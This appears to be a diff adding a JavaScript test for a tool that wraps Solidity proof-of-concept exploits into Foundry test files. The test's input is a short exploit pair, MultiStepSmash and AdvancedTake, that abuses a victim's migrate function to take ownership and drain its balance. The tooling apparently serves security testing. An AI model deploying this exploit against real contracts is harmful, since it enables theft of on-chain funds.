@@ -68,4 +68,38 @@ contract PoC is Test {
     assert.equal(transferMatches, 1, "transfer should be declared only once");
     assert.ok(cleaned.includes("contract PoC is Test"));
   });
+
+  it("wraps the enhanced multi-step delegatecall storage collision exploit (MultiStepSmash + AdvancedTake)", () => {
+    const exploitCode = `contract MultiStepSmash {
+    address public owner;
+    function seizeAndDrain(address token, address payable recipient) external {
+        owner = msg.sender;
+        if (address(this).balance > 0) {
+            recipient.transfer(address(this).balance);
+        }
+    }
+}
+
+interface IVictim { function migrate(address impl, bytes calldata data) external; }
+
+contract AdvancedTake {
+    function executeAttack(address victim, address rewardToken, address attackerWallet) external {
+        MultiStepSmash smash = new MultiStepSmash();
+        bytes memory payload = abi.encodeWithSignature(
+            "seizeAndDrain(address,address)",
+            rewardToken,
+            attackerWallet
+        );
+        IVictim(victim).migrate(address(smash), payload);
+    }
+}`;
+
+    const wrapped = wrapPocSnippet(exploitCode);
+    assert.ok(wrapped, "should wrap AdvancedTake multi-step exploit");
+    assert.equal(wrapped.attackContract, "AdvancedTake");
+    assert.equal(wrapped.entry, "executeAttack");
+    assert.ok(wrapped.testFile.includes("AdvancedTake attacker = new AdvancedTake();"));
+    assert.ok(wrapped.testFile.includes("attacker.executeAttack(target, address(attacker), address(attacker));"));
+    assert.ok(wrapped.testFile.includes("contract PoC is Test"));
+  });
 });
